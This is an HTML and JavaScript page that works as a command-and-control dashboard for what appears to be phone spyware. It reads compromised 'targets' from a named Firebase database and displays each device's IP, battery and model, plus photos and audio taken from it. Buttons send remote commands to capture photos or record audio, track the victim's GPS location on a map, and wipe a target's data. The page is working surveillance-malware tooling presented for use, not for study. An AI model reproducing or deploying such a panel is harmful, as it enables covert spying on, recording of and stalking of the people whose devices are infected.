<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CYBER_COMMAND | GREEN_RED_EDITION</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        :root { --neon: #00ff41; --bg: #050505; --panel: #111; --border: #222; --date-red: #ff3131; }
        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; display: flex; height: 100vh; }
        
        /* Sidebar */
        .sidebar { width: 300px; border-right: 1px solid var(--border); padding: 20px; overflow-y: auto; background: #080808; }
        .target-card { border: 1px solid var(--border); padding: 15px; margin-bottom: 10px; cursor: pointer; border-radius: 5px; transition: 0.3s; }
        .target-card:hover { border-color: var(--neon); background: rgba(0,255,65,0.05); }
        .target-card.active { border-left: 5px solid var(--neon); background: rgba(0,255,65,0.1); }
        
        /* Red Date Styling */
        .red-date { color: var(--date-red); font-weight: bold; text-shadow: 0 0 5px var(--date-red); }

        /* Main Area */
        .main { flex: 1; padding: 25px; overflow-y: auto; }
        .btn { background: transparent; border: 1px solid var(--neon); color: var(--neon); padding: 10px 15px; cursor: pointer; margin: 5px; font-weight: bold; text-transform: uppercase; }
        .btn:hover { background: var(--neon); color: #000; box-shadow: 0 0 15px var(--neon); }
        
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 20px; }
        .box { background: var(--panel); border: 1px solid var(--border); padding: 15px; border-radius: 8px; }
        
        .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 10px; }
        .gallery img { width: 100%; border: 1px solid #333; border-radius: 5px; cursor: pointer; }
        .gallery img:hover { border-color: var(--neon); }
        
        .stat-line { margin: 10px 0; font-size: 14px; color: #888; }
        .stat-line b { color: var(--neon); }
        h1, h2, h3 { letter-spacing: 2px; }
    </style>
</head>
<body>

<div class="sidebar">
    <h2>LIVE_TARGETS</h2>
    <div id="target-list">Scanning...</div>
</div>

<div class="main">
    <h1 id="node-id">AWAITING_SIGNAL</h1>
    
    <div id="controls" style="display:none; margin-bottom: 20px;">
        <button class="btn" onclick="sendCmd('photo')">Capture Photo</button>
        <button class="btn" onclick="sendCmd('audio')">Record Audio</button>
        <button class="btn" onclick="openMaps()">Track GPS</button>
        <button class="btn" style="border-color: #ff3131; color: #ff3131;" onclick="deleteNode()">Wipe Data</button>
    </div>

    <div class="grid">
        <div class="box">
            <h3>SYSTEM_INFO</h3>
            <div id="info-box">Select a node...</div>
        </div>
        <div class="box">
            <h3>AUDIO_LOGS</h3>
            <div id="audio-box">Empty...</div>
        </div>
        <div class="box" style="grid-column: span 2;">
            <h3>VISUAL_FEED</h3>
            <div id="photo-box" class="gallery">Waiting for feed...</div>
        </div>
    </div>
</div>

<script>
    const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    let currentTid = null;
    let gps = null;

    // Time Formatting Function (DD/MM/YYYY, HH:MM:SS)
    function formatRedDate(ts) {
        const d = ts ? new Date(ts) : new Date();
        const date = d.toLocaleDateString('en-GB');
        const time = d.toLocaleTimeString('en-GB');
        return `<span class="red-date">${date}, ${time}</span>`;
    }

    db.ref('targets').on('value', snap => {
        const list = document.getElementById('target-list');
        list.innerHTML = "";
        snap.forEach(c => {
            const tid = c.key;
            list.innerHTML += `
                <div class="target-card ${currentTid === tid ? 'active' : ''}" onclick="selectTarget('${tid}')">
                    <b>${tid}</b><br>
                    <small>Last: ${formatRedDate(null)}</small>
                </div>`;
        });
    });

    function selectTarget(tid) {
        currentTid = tid;
        document.getElementById('node-id').innerText = "TARGET: " + tid;
        document.getElementById('controls').style.display = 'block';
        
        db.ref(`targets/${tid}/info`).on('value', s => {
            const d = s.val() || {};
            document.getElementById('info-box').innerHTML = `
                <div class="stat-line">IP: <b>${d.ip || '---'}</b></div>
                <div class="stat-line">BATT: <b>${d.battery || '---'}</b></div>
                <div class="stat-line">DEVICE: <b>${d.device || '---'}</b></div>
                <div class="stat-line">PING: ${formatRedDate(null)}</div>
            `;
        });

        db.ref(`targets/${tid}/location`).on('value', s => { gps = s.val(); });

        db.ref(`targets/${tid}/photos`).on('value', s => {
            const b = document.getElementById('photo-box'); b.innerHTML = "";
            s.forEach(p => { 
                const data = p.val();
                b.innerHTML += `
                    <div style="text-align:center">
                        <img src="${data.img}" onclick="window.open(this.src)">
                        <div style="font-size:10px; margin-top:5px;">${formatRedDate(data.time)}</div>
                    </div>`; 
            });
        });

        db.ref(`targets/${tid}/audios`).on('value', s => {
            const b = document.getElementById('audio-box'); b.innerHTML = "";
            s.forEach(a => { b.innerHTML += `<audio controls src="${a.val().audio}"></audio>`; });
        });
    }

    function sendCmd(act) { db.ref(`commands/${currentTid}`).set({ action: act, t: Date.now() }); }
    function openMaps() { if(gps && gps.lat) window.open(`https://www.google.com/maps?q=${gps.lat},${gps.lng}`); else alert("GPS Unavailable"); }
    function deleteNode() { if(confirm("Wipe all data for this target?")) db.ref(`targets/${currentTid}`).remove(); }
</script>
</body>
</html>
